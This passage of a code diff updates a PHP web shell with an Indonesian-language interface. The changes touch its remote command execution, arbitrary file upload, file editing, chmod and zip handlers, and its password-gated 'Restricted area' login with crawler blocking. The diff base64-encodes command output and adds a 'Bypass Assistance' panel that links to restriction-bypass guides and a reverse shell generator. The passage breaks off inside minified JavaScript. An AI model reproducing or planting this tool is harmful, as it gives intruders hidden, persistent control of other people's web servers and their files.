-				$outs['stdout'] = "<pre class='pb-0 mb-0'>". @iconv("UTF-8", "ISO-8859-1//IGNORE", addcslashes("~$ ".$_POST['cmd'] . "<br/>" . htmlspecialchars($sendreq['stdout'])."","\t\0"))."</pre>";
+				$outs['stdout'] = base64_encode("<pre class='pb-0 mb-0'>". @iconv("UTF-8", "ISO-8859-1//IGNORE", addcslashes("<span class='text-success font-weight-bold'>".base64_decode($sendreq['userhost']).":</span><span class='text-cyan font-weight-bold'>".base64_decode($sendreq['path'])."</span><span class='text-warning font-weight-bold'>#</span> {$_POST['cmd']}<br/>".htmlspecialchars(base64_decode($sendreq['stdout']))."","\t\0"))."</pre>");
 				$outs['path'] = $sendreq['path'];
+				$outs['userhost'] = $sendreq['userhost'];
 			} else {
-				$outs['stdout'] = "<pre class='pb-0 mb-0'>Sebenernya, apa sih yang anda perintahkan?</pre>";
-				$outs['path'] = $_SESSION['path'];
+				$outs['stdout'] = base64_encode("<pre class='pb-0 mb-0'>Sebenernya, apa sih yang anda perintahkan?</pre>");
+				$outs['path'] = base64_encode($_SESSION['path']);
+				$outs['userhost'] = base64_encode('0');
 			}
 			header("Content-type: application/json; charset=utf-8");
 			echo json_encode($outs);
@@ -439,7 +454,7 @@ if(isset($_GET['act'])){
 						$outs = "Direktori berhasil dibuat!";
 					} else {
 						$sendreq = cmd("mkdir ".$xpath, $_POST['xpath']);
-						$outs = @iconv("UTF-8", "ISO-8859-1//IGNORE", addcslashes($sendreq['stdout'])) ? "Direktori berhasil dibuat!" : "Gagal membuat direktori!";
+						$outs = isset($sendreq['stdout']) && strlen($sendreq['stdout'])>2 ? "Direktori berhasil dibuat!" : "Gagal membuat direktori!";
 					}
 				} else {
 					$outs = "Direktori sudah ada!";
@@ -475,7 +490,7 @@ if(isset($_GET['act'])){
 			$xpath = $_POST['xpath'];
 			if(@is_readable($xpath)){
 				$outs = '';
-				if(filesize($xpath)>0){
+				if(@filesize($xpath)>0){
 					if(AvFunc(array('fopen','fread','fclose','feof'))){
 						$fp = @fopen($xpath, 'r');
 						if($fp){
@@ -501,25 +516,29 @@ if(isset($_GET['act'])){
 	} else if($_GET['act'] == 'upload'){
 		@ini_set('output_buffering', 0);
 		$xpath = $_POST['xpath'];
-		for($cf=0; $cf<count(@$_FILES['xfile']['name']); $cf++){
-			if(isset($_FILES['xfile']['name'][$cf]) && @$_FILES['xfile']['name'][$cf] != null){
-				$fname = @$_FILES['xfile']['name'][$cf];
-				if(file_exists($xpath."/".$fname)){
-					@unlink($xpath."/".$fname);
-				}
-				if(AvFunc(array('file_put_contents'))){
-					$upfiles = @file_put_contents($xpath."/".$fname, @file_get_contents(@$_FILES['xfile']['tmp_name'][$cf]));
-					if($upfiles){
-						$outs[] = file_exists($xpath."/".$fname) ? $fname." uploaded!" : $fname." failed!";
+		if(is_writable($xpath)){
+			for($cf=0; $cf<count(@$_FILES['xfile']['name']); $cf++){
+				if(@$_FILES['xfile']['size'][$cf] > 0){
+					$fname = @$_FILES['xfile']['name'][$cf];
+					$ftmp = @$_FILES['xfile']['tmp_name'][$cf];
+					if(AvFunc(array('move_uploaded_file'))){
+						if(file_exists($xpath."/".$fname)){@unlink($xpath."/".$fname);}
+						$outs[] = @move_uploaded_file($ftmp, $xpath."/".$fname) ? $fname." uploaded!" : $fname." faileds!";
+					} else if(AvFunc(array('file_put_contents', 'file_get_contents'))){
+						if(file_exists($xpath."/".$fname)){@unlink($xpath."/".$fname);}
+						$upfiles = @file_put_contents($xpath."/".$fname, @file_get_contents(@$ftmp));
+						if($upfiles){
+							$outs[] = file_exists($xpath."/".$fname) ? $fname." uploaded!" : $fname." failed!";
+						} else {
+							$outs[] = $fname." failed!";
+						}
 					} else {
 						$outs[] = $fname." failed!";
 					}
-				} else if(AvFunc(array('move_uploaded_file'))){
-					$outs[] = move_uploaded_file($_FILES['xfile']['tmp_name'][$cf], $fname) ? $fname." uploaded!" : $fname." failed!";
-				} else {
-					$outs[] = $fname." failed!";
 				}
 			}
+		} else {
+			$outs[] = "Gak bisa upload file di direktori ini!";
 		}
 		echo isset($outs) ? implode('<br/>', $outs) : 'Invalid file!';
 		die();
@@ -724,7 +743,7 @@ if(isset($_GET['act'])){
 			}
 			echo $dout;
 		} else {
-			echo filemanager($_SESSION['path']);
+			echo base64_encode(filemanager($_SESSION['path']));
 		}
 		die();
 	} else if($_GET['act'] == 'logout'){
@@ -746,7 +765,7 @@ if(isset($_POST['xpass'])){
 if(!isset($_SESSION['auth'])){
 	blockCrawler();
 	echo "<html>
-		<head><meta name='viewport' content='width=device-width, initial-scale=1'/><link rel='shortcut icon' href='https://clipart-library.com/data_images/554935.png'/><title>Restricted area</title><link rel='preconnect' href='https://fonts.googleapis.com'><link rel='preconnect' href='https://fonts.gstatic.com' crossorigin/><link href='https://fonts.googleapis.com/css2?family=Montserrat:ital@0;1&display=swap' rel='stylesheet'/></head>
+		<head><meta name='viewport' content='width=device-width, initial-scale=1'/><link rel='shortcut icon' href='".fType('logo')."'/><title>Restricted area</title><link rel='preconnect' href='https://fonts.googleapis.com'><link rel='preconnect' href='https://fonts.gstatic.com' crossorigin/><link href='https://fonts.googleapis.com/css2?family=Montserrat:ital@0;1&display=swap' rel='stylesheet'/></head>
 		<body style='font-family: \"Montserrat\", sans-serif;'>
 			<form action='' method='post'>
 				<fieldset style='background-color:#eeeeee; border-radius:.3em; border:.5px solid #0066b6;'>
@@ -767,10 +786,10 @@ if(!isset($_SESSION['auth'])){
 	<head>
 		<meta charset="utf-8"/>
 		<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"/>
-		<link rel="shortcut icon" href="https://clipart-library.com/data_images/554935.png"/>
+		<link rel="shortcut icon" href="<?php echo fType('logo');?>"/>
 		<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/4.6.2/css/bootstrap.min.css" integrity="sha512-rt/SrQ4UNIaGfDyEXZtNcyWvQeOq0QLygHluFQcSjaGB04IxWhal71tKuzP6K8eYXYB6vJV4pHkXcmFGGQ1/0w==" crossorigin="anonymous" referrerpolicy="no-referrer" />
 		<title><?php echo $stitle;?></title>
-		<style>:root{--bg-icon:#149232;--bg-success:#00d433;--bs-success-rgb:0,212,51;--bs-danger-rgb:220,53,69}.modal .modal-body,body,html{background:#2b2f34}body button{color:#eee}.blockquote,body{font-size:1em}body{padding-top:5.25rem;color:#ddd}.row{margin-left:-10px;margin-right:-10px}.col,[class*=col-]{padding-right:10px;padding-left:10px}input{font-size:1em!important}nav .nav-tabs{border-bottom:1px solid #0066b6}nav .nav-tabs .nav-link.active{background:#0066b6;color:#fff}nav .nav-tabs .nav-link.active svg path{fill:#ffffff!important}nav .nav-tabs .nav-link.active,nav .nav-tabs .nav-link:focus,nav .nav-tabs .nav-link:hover{border:1px solid #0066b6}table{border-radius:10px}table td,table th{border-top:1px solid #444c54!important}table tr:nth-child(odd){background:rgb(var(--bs-success-rgb),5%)}table thead th{background:rgb(var(--bs-success-rgb),20%);border-top:0 solid #eee!important;border-bottom:2px solid var(--bg-success)!important}table thead tr th:first-child{border-top-left-radius:.25rem}table thead tr th:last-child{border-top-right-radius:.25rem}.breadcrumb-item a,table tbody{color:#cfdce8}table tbody tr:hover td{color:#fff;transition:.3s}table tbody tr:hover{background:rgb(var(--bs-success-rgb),10%)}.breadcrumb{background:linear-gradient(45deg,rgb(var(--bs-success-rgb),20%),transparent);padding:2px 10px}.breadcrumb-item a:hover{color:var(--bg-success)}.breadcrumb-item+.breadcrumb-item{padding-left:.2rem}.breadcrumb-item+.breadcrumb-item::before{padding-right:.2rem}.form-control-sm{height:auto}.form-control:disabled,.form-control[readonly]{background:#272c31;color:#767676}.media.dir svg{margin:auto;padding-right:.5em}.media.file svg{margin:auto;padding:0 .7em 0 .25em}.fsmall{display:block;font-size:1.75vh;color:#61aa64}.bg-success-rgb,.input-group-prepend *{background:rgb(var(--bs-success-rgb),30%);border:1px solid rgb(var(--bs-success-rgb),50%);color:rgb(var(--bs-success-rgb),90%)}#hasilcommand *,input[type=text],input[type=text]:active,input[type=text]:focus{background:#343a40;color:#cfdce8}.custom-select{padding:5px 10px;color:#cfdce8;background:url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' width='4' height='5' viewBox='0 0 4 5'%3e%3cpath fill='%23149232' d='M2 0L0 2h4zm0 5L0 3h4z'/%3e%3c/svg%3e") right .75rem center/8px 10px no-repeat #343a40}.custom-file *{background:#343a40;color:#cfdce8;border:1px solid rgb(var(--bs-success-rgb),50%)}.custom-file-label::after{content:"multiple";color:var(--success);background:#2b2f34}#hasilcommand .card{border-radius:.25rem;border:1px solid rgb(var(--bs-success-rgb),50%)}#hasilcommand .card .card-body{border-radius:.25rem}.text-success{color:rgb(0,212,51,90%)!important;color:#eee}@media screen and (max-width:420px){nav .nav-tabs .nav-link{padding:.5rem 1rem;letter-spacing:-.1em}.btn{padding:0 10px!important}}@media screen and (max-width:767px){body{padding-top:4rem;}.container{max-width:100%!important}.blockquote,.btn,.input-group-text,body{font-size:.8em!important}.fsmall{font-size:1.5vh}.form-control-sm{font-size:initial;height:auto}.custom-select{font-size:inherit;height:auto!important}.custom-file,.custom-file-input,.custom-file-label{height:calc(1.5em + .75rem)!important}}</style>
+		<style>:root{--cyan:#2be2ff;--bg-icon:#149232;--bg-success:#00d433;--bs-success-rgb:0,212,51;--bs-danger-rgb:220,53,69}.modal .modal-body,body,html{background:#2b2f34}body button{color:#eee}.blockquote,body{font-size:1em}body{padding-top:5.25rem;color:#ddd}.row{margin-left:-10px;margin-right:-10px}.col,[class*=col-]{padding-right:10px;padding-left:10px}input{font-size:1em!important}nav .nav-tabs{border-bottom:1px solid #2be2ff}nav .nav-tabs .nav-link.active{background:#00a6c0;color:#fff}nav .nav-tabs .nav-link.active svg path{fill:#ffffff!important}nav .nav-tabs .nav-link.active,nav .nav-tabs .nav-link:focus,nav .nav-tabs .nav-link:hover{border:1px solid #2be2ff}table{border-radius:10px}table td,table th{border-top:1px solid #444c54!important}table tr:nth-child(odd){background:rgb(var(--bs-success-rgb),5%)}table thead th{background:rgb(var(--bs-success-rgb),20%);border-top:0 solid #eee!important;border-bottom:2px solid var(--bg-success)!important}table thead tr th:first-child{border-top-left-radius:.25rem}table thead tr th:last-child{border-top-right-radius:.25rem}.breadcrumb-item a,table tbody{color:#cfdce8}table tbody tr:hover td{color:#fff;transition:.3s}table tbody tr:hover{background:rgb(var(--bs-success-rgb),10%)}.breadcrumb{background:linear-gradient(177deg,rgb(var(--bs-success-rgb),20%),transparent);padding:2px 10px}.breadcrumb-item a:hover{color:var(--bg-success)}.breadcrumb-item+.breadcrumb-item{padding-left:.2rem}.breadcrumb-item+.breadcrumb-item::before{padding-right:.2rem}.form-control-sm{height:auto}.form-control:disabled,.form-control[readonly]{background:#272c31;color:#767676}.media.dir svg{margin:auto;padding-right:.5em}.media.file svg{margin:auto;padding:0 .7em 0 .25em}.fsmall{display:block;font-size:1.75vh;color:#61aa64}.bg-success-rgb,.input-group-prepend *{background:rgb(var(--bs-success-rgb),30%);border:1px solid rgb(var(--bs-success-rgb),50%);color:rgb(var(--bs-success-rgb),90%)}#hasilcommand *,input[type=text],input[type=text]:active,input[type=text]:focus{background:#343a40;color:#cfdce8}.custom-select{padding:5px 10px;color:#cfdce8;background:url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' width='4' height='5' viewBox='0 0 4 5'%3e%3cpath fill='%23149232' d='M2 0L0 2h4zm0 5L0 3h4z'/%3e%3c/svg%3e") right .75rem center/8px 10px no-repeat #343a40}.custom-file *{background:#343a40;color:#cfdce8;border:1px solid rgb(var(--bs-success-rgb),50%)}.custom-file-label::after{content:"multiple";color:var(--success);background:#2b2f34}#hasilcommand .card{border-radius:.25rem;border:1px solid rgb(var(--bs-success-rgb),50%)}#hasilcommand .card .card-body{border-radius:.25rem}.text-success{color:rgb(0,212,51,90%)!important;}.text-cyan{color:var(--cyan)!important;color:#eee}@media screen and (max-width:420px){nav .nav-tabs .nav-link{padding:.5rem 1rem;letter-spacing:-.1em}.btn{padding:0 10px!important}}@media screen and (max-width:767px){body{padding-top:4rem;}.container{max-width:100%!important}.blockquote,.btn,.input-group-text,body{font-size:.8em!important}.fsmall{font-size:1.5vh}.form-control-sm{font-size:initial;height:auto}.custom-select{font-size:inherit;height:auto!important}.custom-file,.custom-file-input,.custom-file-label{height:calc(1.5em + .75rem)!important}}</style>
 	</head>
 	<body class="text-monospace">
 		<header class="header bg-dark fixed-top mt-auto py-md-3 py-2">
@@ -782,19 +801,19 @@ if(!isset($_SESSION['auth'])){
 			<nav>
 				<div class="nav nav-tabs" id="nav-tab" role="tablist">
 					<button class="nav-link active" id="fmanager" data-toggle="tab" data-target="#nav-berkas" data-tempdir="<?php echo $_SESSION['path'];?>" type="button" role="tab" aria-controls="nav-berkas" aria-selected="true">
-						<svg xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 576 512" class="d-block d-sm-none"><path fill="var(--bg-icon)" d="M384 480h48c11.4 0 21.9-6 27.6-15.9l112-192c5.8-9.9 5.8-22.1 .1-32.1S555.5 224 544 224H144c-11.4 0-21.9 6-27.6 15.9L48 357.1V96c0-8.8 7.2-16 16-16H181.5c4.2 0 8.3 1.7 11.3 4.7l26.5 26.5c21 21 49.5 32.8 79.2 32.8H416c8.8 0 16 7.2 16 16v32h48V160c0-35.3-28.7-64-64-64H298.5c-17 0-33.3-6.7-45.3-18.7L226.7 50.7c-12-12-28.3-18.7-45.3-18.7H64C28.7 32 0 60.7 0 96V416c0 35.3 28.7 64 64 64H87.7 384z"/></svg>
+						<span class="d-block d-sm-none"><?php echo fType('dir','1.2em');?></span>
 						<span class="d-none d-sm-block">Files</span>
 					</button>
 					<button class="nav-link" data-toggle="tab" data-target="#nav-cmd" type="button" role="tab" aria-controls="nav-cmd" aria-selected="false">
-						<svg xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 576 512" class="d-block d-sm-none"><path fill="var(--bg-icon)" d="M9.4 86.6C-3.1 74.1-3.1 53.9 9.4 41.4s32.8-12.5 45.3 0l192 192c12.5 12.5 12.5 32.8 0 45.3l-192 192c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L178.7 256 9.4 86.6zM256 416H544c17.7 0 32 14.3 32 32s-14.3 32-32 32H256c-17.7 0-32-14.3-32-32s14.3-32 32-32z"/></svg>
+						<span class="d-block d-sm-none"><?php echo fType('cmd','1em');?></span>
 						<span class="d-none d-sm-block">Command</span>
 					</button>
 					<button class="nav-link" data-toggle="tab" data-target="#nav-info" type="button" role="tab" aria-controls="nav-info" aria-selected="false">
-						<svg xmlns="http://www.w3.org/2000/svg" height="1.2em" viewBox="0 0 16 16" class="d-block d-sm-none"><path fill="var(--bg-icon)" d="M8,0 C12.4183,0 16,3.58173 16,8 C16,12.4183 12.4183,16 8,16 C3.58167,16 0,12.4183 0,8 C0,3.58173 3.58167,0 8,0 Z M8,2 C4.68628,2 2,4.68628 2,8 C2,11.3137 4.68628,14 8,14 C11.3137,14 14,11.3137 14,8 C14,4.68628 11.3137,2 8,2 Z M8,7 C8.51280357,7 8.93550255,7.38604429 8.99327177,7.88337975 L9,8 L9,11 C9,11.5523 8.55225,12 8,12 C7.48719643,12 7.06449745,11.613973 7.00672823,11.1166239 L7,11 L7,8 C7,7.44772 7.44775,7 8,7 Z M8,4 C8.55225,4 9,4.44772 9,5 C9,5.55228 8.55225,6 8,6 C7.44775,6 7,5.55228 7,5 C7,4.44772 7.44775,4 8,4 Z"/></svg>
+						<span class="d-block d-sm-none"><?php echo fType('info','1.2em');?></span>
 						<span class="d-none d-sm-block">Info</span>
 					</button>
-					<a class="nav-link ml-auto bg-danger text-white" type="button" href="?act=logout">
-						<svg xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 512 512" class="d-block d-sm-none"><path fill="#ffffff" d="M377.9 105.9L500.7 228.7c7.2 7.2 11.3 17.1 11.3 27.3s-4.1 20.1-11.3 27.3L377.9 406.1c-6.4 6.4-15 9.9-24 9.9c-18.7 0-33.9-15.2-33.9-33.9l0-62.1-128 0c-17.7 0-32-14.3-32-32l0-64c0-17.7 14.3-32 32-32l128 0 0-62.1c0-18.7 15.2-33.9 33.9-33.9c9 0 17.6 3.6 24 9.9zM160 96L96 96c-17.7 0-32 14.3-32 32l0 256c0 17.7 14.3 32 32 32l64 0c17.7 0 32 14.3 32 32s-14.3 32-32 32l-64 0c-53 0-96-43-96-96L0 128C0 75 43 32 96 32l64 0c17.7 0 32 14.3 32 32s-14.3 32-32 32z"/></svg>
+					<a class="nav-link ml-auto bg-danger text-white" href="?act=logout" type="button" style="border:1px solid var(--cyan) !important;">
+						<span class="d-block d-sm-none"><?php echo fType('out','1.2em');?></span>
 						<span class="d-none d-sm-block">Logout</span>
 					</a>
 				</div>
@@ -874,16 +893,16 @@ if(!isset($_SESSION['auth'])){
 						<div class="col-12 mb-3">
 							<span>Bypass Assistance:</span>
 							<ul class="ml-n4">
-								<li><a href="https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions" target="_blank">Linux Restrictions</a></li>
-								<li><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass" target="_blank">PHP - Useful Functions</a></li>
-								<li><a href="https://www.revshells.com/" target="_blank">Reverse shell generator</a></li>
+								<li><a href="https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions" target="_blank" class="text-cyan">Linux Restrictions</a></li>
+								<li><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass" target="_blank" class="text-cyan">PHP - Useful Functions</a></li>
+								<li><a href="https://www.revshells.com/" target="_blank" class="text-cyan">Reverse shell generator</a></li>
 							</ul>
 						</div>
 					</div>
 				</div>
 				<div class="tab-pane fade" id="nav-info" role="tabpanel">
 					<div class="row">
-						<div class="col-12 mb-3" id="showinfo"></div>
+						<div class="col-12" id="showinfo"></div>
 					</div>
 				</div>
 			</div>
@@ -944,7 +963,7 @@ if(!isset($_SESSION['auth'])){
 		</footer>
 		<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.0/jquery.min.js" integrity="sha512-3gJwYpMe3QewGELv8k/BX9vcqhryRdzRMxVfq6ngyWXwo03GFEzjsUm8Q7RZcHPHksttq7/GFoxjCVUjkjvPdw==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
 		<script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/4.6.2/js/bootstrap.bundle.min.js" integrity="sha512-igl8WEUuas9k5dtnhKqyyld6TzzRjvMqLC79jkgT3z02FvJyHAuUtyemm/P/jYSne1xwFI06ezQxEwweaiV7VA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
-		<script>!function(t){var a='<span class="bg-transparent"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" style="margin:auto; padding-right:.5em; background:transparent;"><style>.spinner{transform-origin:center;animation:spinners .75s infinite linear}@keyframes spinners{100%{transform:rotate(360deg)}}</style><path d="M12,1A11,11,0,1,0,23,12,11,11,0,0,0,12,1Zm0,19a8,8,0,1,1,8-8A8,8,0,0,1,12,20Z" opacity=".25"/><path fill="var(--light)" class="spinner" d="M10.72,19.9a8,8,0,0,1-6.5-9.79A7.77,7.77,0,0,1,10.4,4.16a8,8,0,0,1,9.49,6.52A1.54,1.54,0,0,0,21.38,12h.13a1.37,1.37,0,0,0,1.38-1.54,11,11,0,1,0-12.7,12.39A1.54,1.54,0,0,0,12,21.34h0A1.47,1.47,0,0,0,10.72,19.9Z"/></svg>Tunggu bentar...</span>';let e={bs64ToBit:function(t){let a=atob(t);return Uint8Array.from(a,t=>t.codePointAt(0))},btTobs64:function(t){let a=String.fromCodePoint(...t);return btoa(a)},isWellFormed:function(t){if(void 0!==t)return t.isWellFormed();try{return encodeURIComponent(t),!0}catch(a){return!1}},encode:function(t){return e.isWellFormed(t)?e.btTobs64(new TextEncoder().encode(t)):""},decode:function(t){return e.isWellFormed(t)?new TextDecoder().decode(e.bs64ToBit(t)):""}},n=(a,e)=>{t("#shownotif").html('<div id="liveToast" class="toast hide" role="alert" aria-live="assertive" aria-atomic="true" data-delay="10000"><div class="toast-header"><img src="https://clipart-library.com/data_images/554935.png" width="20" class="rounded mr-2" alt="icon"/><strong class="mr-auto">'+a+'</strong><button type="button" class="ml-2 mb-1 close" data-dismiss="toast" aria-label="Close"><span aria-hidden="true">&times;</span></button></div><div class="toast-body text-secondary">'+e+"</div></div>"),t(".toast").toast("show")};function i(e,i,o,r){var d=t("#modalshowaksi").find(".modal-body");t.ajax({type:"get",url:"?act=path&dir="+i+"&entry="+o+"&opt="+e,beforeSend:function(){d.html(a)}}).done(function(t){d.html(""),r(t)}).fail(function(t,a,e){n("Error",t.status),d.html("error_code: "+t.status)})}function o(a){for(var e=0;e<a.length;e++)a[e].addEventListener("change",function(a){var e=t("option:selected",this)[0],n=e.value,o=t("#modalshowaksi"),r="",d="",l=e.attributes["data-xtype"],s=e.attributes["data-xname"],m=e.attributes["data-xpath"],f=a.currentTarget;if(n.length>0){switch(n){case"rename":d="Rename "+l.value.toUpperCase(),r='<form method="post" action="?act=rename" id="rqrename"><input type="hidden" name="xtype" value="'+l.value+'"/><input type="hidden" name="xpath" value="'+m.value+'"/><div class="form-group row"><label for="oname" class="col-sm-2 col-form-label">Name</label><div class="col-sm-10"><input type="text" class="form-control border-success" id="oname" name="oname" readonly="readonly" value="'+s.value+'"/></div></div><div class="form-group row"><label for="xname" class="col-sm-2 col-form-label">Rename</label><div class="col-sm-10"><div class="input-group mb-3"><input type="text" class="form-control border-success" id="xname" name="xname" value="'+s.value+'"/><div class="input-group-append"><button class="btn btn-outline-success" type="submit">GO</button></div></div></div></div></form>';break;case"touch":d="Touch "+l.value.toUpperCase()+" ("+s.value+")",r='<form method="post" action="?act=touch" id="rqtouch"><input type="hidden" name="xtype" value="'+l.value+'"/><input type="hidden" name="xpath" value="'+m.value+'"/><input type="hidden" name="xname" value="'+s.value+'"/><div class="form-group row"><label for="xtime" class="col-sm-2 col-form-label">Datetime</label><div class="col-sm-10"><div class="input-group"><input type="text" class="form-control border-success" id="xtime" name="xtime" value="'+e.attributes["data-xtime"].value+'"/><div class="input-group-append"><button class="btn btn-outline-success" type="submit">GO</button></div></div></div></div></form>'}"download"==n?window.open("?act=path&dir="+m.value+"&entry="+s.value+"&opt="+n,"_blank"):"del"==n||"zip"==n||"unzip"==n?(o.modal("show"),o.find(".modal-title").html(n+" /"+s.value),o.find(".modal-body").html('<form method="post" action="?act='+n+'" id="rq'+n+'" class="text-center"><input type="hidden" name="xtype" value="'+l.value+'"/><input type="hidden" name="xname" value="'+s.value+'"/><input type="hidden" name="xpath" value="'+m.value+'"/><div class="alert alert-info">Klik proses utk melanjutkan!!</div><button class="btn btn-outline-success" type="submit">Proses!</button></form>'),o.on("hidden.bs.modal",function(t){o.find(".modal-title").html("unknown"),o.find(".modal-body").html("null"),f.value=""})):"edit"==n?(o.modal("show"),o.find(".modal-body").addClass("pt-0 px-0"),o.find(".modal-title").html("Edit "+l.value.toUpperCase()+": /"+s.value),i("view",m.value,s.value,function(t){var a='<form method="post" action="?act=path&dir='+m.value+"&entry="+s.value+'&opt=edit" id="rqeditfile"><div class="d-block mb-3"><textarea name="xdata" class="form-control rounded-0" style="white-space:pre;" rows="20">'+t+'</textarea></div><center><button class="btn btn-outline-success text-center" type="submit">Simpan</button></center></form>';o.find(".modal-body").html(a)}),o.on("hidden.bs.modal",function(t){o.find(".modal-title").html("unknown"),o.find(".modal-body").removeClass("pt-0 px-0").html("null"),f.value=""})):"view"==n?(o.modal("show"),o.find(".modal-title").html("View "+l.value.toUpperCase()+": /"+s.value),i("view",m.value,s.value,function(t){o.find(".modal-body").attr("style","background:#dfdfdf;").addClass("rounded-0").html('<code><pre class="mb-0">'+t+"</pre></code>")}),o.on("hidden.bs.modal",function(t){o.find(".modal-title").html("unknown"),o.find(".modal-body").attr("style","").removeClass("rounded-0").html("null"),f.value=""})):(o.modal("show"),o.find(".modal-title").html(d),o.find(".modal-body").html(r),o.on("hidden.bs.modal",function(t){o.find(".modal-title").html("unknown"),o.find(".modal-body").html("null"),f.value=""}))}else o.modal("show"),o.find(".modal-title").html("View null"),i("view",m.value,s.value,function(t){o.find(".modal-body").attr("style","background:#dfdfdf;").html("<code>null</code>")}),o.on("hidden.bs.modal",function(t){o.find(".modal-title").html("unknown"),o.find(".modal-body").attr("style","").html("null"),f.value=""})},!1)}function r(e,i){t.ajax({type:"get",url:"?act=path&dir="+e,timeout:5e3,beforeSend:function(){t("#fileman").html(a),t("form#rqupload,form#rqmkdir,form#rqchdir,form#rqreadfile").hide()}}).done(function(a,n,o){t("#fileman").html(a),t("form#rqupload,form#rqmkdir,form#rqchdir,form#rqreadfile").show().find('input[name="xpath"]').val(e),t("form#rqcmd").find('input[name="xpath"]').val(e),t("button#fmanager").attr("data-tempdir",e),i(a)}).fail(function(a,i,o){t("#fileman").html(i+", response code: "+a.status),t("form#rqupload,form#rqmkdir,form#rqchdir,form#rqreadfile").hide(),t("form#rqcmd").find('input[name="xpath"]').val(e),t("button#fmanager").attr("data-tempdir",e),n("Error",i+", response code: "+a.status)})}t(document).on("click","a#chdrive",function(e){e.preventDefault();var n=t(e.currentTarget).attr("data-path");t.ajax({type:"get",url:"?act=path&dir="+n,beforeSend:function(){t("body").find("#fileman").html(a),t("form#rqupload,form#rqmkdir,form#rqchdir,form#rqreadfile").hide()},success:function(a){t("body").find("#fileman").html(a),t("form#rqupload,form#rqmkdir,form#rqchdir,form#rqreadfile").show().find('input[name="xpath"]').val(n),t("form#rqcmd").find('input[name="xpath"]').val(n)}}).done(function(){o(document.querySelectorAll("#showaksi")),t("form#rqcmd").find('input[name="xpath"]').val(n),t("form#rqcmd").parent().find("#hasilcommand").html("")})}),t(document).on("click","a#chdir",function(a){a.preventDefault();var e=t(a.currentTarget).attr("data-path");t("ol.breadcrumb").addClass("pl-0").css({background:"transparent",padding:"0"}).html('<li class="breadcrumb-item w-100 active">					<form method="post" action="?act=changedir" class="mb-0" id="rqchdir">						<div class="input-group">							<input type="text" name="xpath" class="form-control form-control-sm border-success" value="'+e+'"></input>							<div class="input-group-append">								<button class="btn btn-outline-success" type="submit">Go</button>							</div>						</div>					</form></li>')}),t("button#fmanager").on("click",function(e){e.preventDefault();var n=t(e.currentTarget).attr("data-tempdir");t.ajax({type:"get",url:"?act=path&dir="+n,beforeSend:function(){t("body").find("#fileman").html(a),t("form#rqupload,form#rqmkdir,form#rqchdir,form#rqreadfile").hide()},success:function(a){t("body").find("#fileman").html(a),t("form#rqupload,form#rqmkdir,form#rqchdir,form#rqreadfile").show().find('input[name="xpath"]').val(n),t("form#rqcmd").find('input[name="xpath"]').val(n)}}).done(function(){o(document.querySelectorAll("#showaksi")),t("form#rqcmd").find('input[name="xpath"]').val(n),t("form#rqcmd").parents().find("#hasilcommand").html("")})}),t("button#fmanager").trigger("click"),t('button[data-target="#nav-cmd"]').on("shown.bs.tab",function(a){t("#hasilcommand").hide()}),t('button[data-target="#nav-berkas"]').on("shown.bs.tab",function(a){t("#fberkas").show()}),t('button[data-target="#nav-berkas"]').on("hidden.bs.tab",function(a){t("#fberkas").hide()}),t('button[data-target="#nav-info"]').on("hidden.bs.tab",function(a){t("#nav-info").find("#showinfo").html("")}),t('button[data-target="#nav-info"]').on("shown.bs.tab",function(e){t.ajax({type:"get",url:"?act=info",dataType:"json",beforeSend:function(){t("#nav-info").find("#showinfo").html(a)}}).done(function(a){try{var e=JSON.parse(JSON.stringify(a)),n=t.map(e,function(t,a){return[t]});t("#nav-info").find("#showinfo").html(n.join(""))}catch(i){t("#nav-info").find("#showinfo").html("Error: Gagal menganalisa server!")}})}),t("#fileman").length>0&&(t("#fileman").on("click","a#ffmanager, button#ffmanager",function(a){a.stopPropagation(),r(t(this).attr("data-path"),function(){o(document.querySelectorAll("#showaksi"))})}),t("#fileman").on("click","a#fxmanager",function(a){a.stopPropagation(),r(t(this).attr("data-path"),function(){o(document.querySelectorAll("#showaksi"))})})),t("#showchmod").on("show.bs.modal",function(a){var e=t(a.relatedTarget),n=t(this).find(".modal-body"),i=e.attr("data-xtype"),o=e.attr("data-xname"),r=e.attr("data-xpath"),d=e.attr("data-xperm");n.find('input[name="xtype"]').val(i),n.find('input[name="xname"]').val(o),n.find('input[name="xpath"]').val(r),n.find('input[name="xperm"]').val(d),n.find('input[id="xname"]').val(o),n.find('label[for="xname"]').text(i.toUpperCase())}),t.each(["rqdel","rqzip","rqunzip","rqrename","rqtouch","rqchmod","rqreadfile","rqeditfile","rqnewfile"],function(i,o){t(document).on("submit","form#"+o,function(i){i.preventDefault();var r=t(this),d=t("#modalshowaksi");if(r.find('button[type="submit"]').prop("disabled",!0),"rqrename"==o||"rqtouch"==o)r.find('input[readonly="readonly"]').prop("readonly",!1);else if("rqeditfile"==o||"rqnewfile"==o)var l=e.encode(r.find('textarea[name="xdata"]').val());else if("rqreadfile"==o){var s=r.find('input[name="xpath"]').val();s.length<1?n("Opss!","Isi dulu nama filenya pak!"):(d.modal("show"),d.find(".modal-title").html("View FILE: "+s))}t.ajax({type:"post",url:r.attr("action"),data:"rqeditfile"==o||"rqnewfile"==o?{xdata:l}:r.serialize(),beforeSend:function(){t(a).insertAfter(r)}}).done(function(a){if(r.next("span").remove(),r.find('button[type="submit"]').prop("disabled",!1),"rqreadfile"==o)d.find(".modal-body").attr("style","background:#dfdfdf;").html('<code><pre 